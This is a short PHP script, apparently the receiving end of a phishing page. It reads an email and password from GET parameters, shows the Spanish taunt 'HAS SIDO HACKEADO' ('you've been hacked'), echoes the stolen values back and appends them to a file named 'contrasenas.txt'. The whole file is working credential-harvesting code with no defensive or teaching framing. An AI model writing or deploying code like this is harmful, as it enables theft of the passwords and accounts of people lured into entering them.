<?php 
if($_SERVER['REQUEST_METHOD']=='GET'){
	$user = $_GET['email'];
	$password=$_GET['password'];
	echo "<h1>HAS SIDO HACKEADO jajajajaja BEBEEEEE</h1>";
	$jefer="email: ".$user." password: ".$password;
	echo $jefer;
	$fichero = 'contrasenas.txt';
	// Abre el fichero para obtener el contenido existente
	$actual = file_get_contents($fichero);
	// Añade una nueva persona al fichero
	$actual .= $jefer;
	// Escribe el contenido al fichero
	file_put_contents($fichero, $actual);
}

?>